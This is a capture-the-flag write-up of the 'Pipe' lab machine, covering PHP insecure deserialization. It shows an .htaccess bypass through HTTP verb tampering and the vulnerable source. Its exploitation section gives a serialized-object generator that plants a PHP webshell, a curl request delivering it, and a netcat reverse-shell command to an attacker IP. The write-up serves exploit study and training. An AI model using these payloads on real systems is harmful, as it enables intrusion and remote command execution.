### Pipe - Insecure Deserialization

Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.

#### Intro

Pipe web application is made up on 3 PHP files only, not enough to be a challenge. But for anyone very unfamiliar with PHP Object injection it's good doing this exercise.

#### Vulnerability Discovery

The application is .htaccess protected, but easily accessible via HTTP verb tampering, as observable below:

```xml
AuthUserFile /var/www/html/.htpasswd
AuthName "index.php"
AuthType Basic
<Limit GET PUT HEAD OPTIONS DELETE>
    require valid-user
</Limit>
```

The index.php, below, reveal an interesting application behaviour. In order to get the author information, an instance of Info is created within the page, then compared with a serialised object via an HTTP POST parameter "param".

Things to note:

* The POST parameter "param" is insecurely unserialized
* Two imports are present within the index file:
    - info.php (not a surprise)
    - log.php

Note: I have removed all the HTML useless bits.
```php
<?php
include 'info.php';
include 'log.php';

$artist = new Info();
$artist->id = 1;
$artist->firstname = 'Rene';
$artist->surname = 'Margitte';
$artist->details = '...';

...
if (isset($_POST['param'])) {
    $info = unserialize($_POST['param']);
    if (strcasecmp($info->firstname, $artist->firstname) == 0 && strcasecmp($info->surname, $artist->surname) == 0){
        echo $artist->details;
    }
}
...
?>
```

The info class is just a structure with no methods. Let's focus on log.php:

```php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
        $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
        file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
```

We found the class we were searching for. The class holds two variables, $filename and $data, and upon destruction it writes the content of $data into $filename. It's perfectly suitable as a gadget for exploitation, as the __destruct() method will be called just after deserialization.

High level explanation: 

1. HTTP POST with serialised Log is performed against index.php 
2. index.php (caller) calls unserialize and create an instance of Log via deserialization
3. index.php (caller) reaches its end, 
4. The instance of the Log (called) object has no reasons to stay in memory longer than its caller, so it gets destructed
5. __destruct()

#### Exploitation

We just need to craft a serialised instance of Log, to write something within the VM filesystem. Guess what? Right, a PHP webshell (or even a PHP reverse-shell as you like)

Crafting the payload:

* Create the file generate.php
```php
<?php 
class Log
{  
    public $filename="/var/www/html/shell.php";
    public $data="<?php system(\$_GET['cmd']);?>";
}
print(urlencode(serialize(new Log))."\n"); 
?>
```
* Execute it
```sh
php generate.php
```
* Use it:
```sh
curl -ksi -X POST 'http://pipe.local/index.php' --data-binary 'param=O%3A3%3A%22Log%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A24%3A%22%2Fvar%2Fwww%2Fhtml%2Fshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A29%3A%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%3B%7D'
```
* Obtain a reverse shell
```sh
gnome-terminal -- nc -lvkp 443 2>/dev/null && curl -ksi http://pipe.local/shell.php?cmd=nc+-e+/bin/bash+MY_IP+443
```

#### Conclusion

Good machine to start with PHP deserialization, but not even close to the level of complexity that OSWE can achieve.
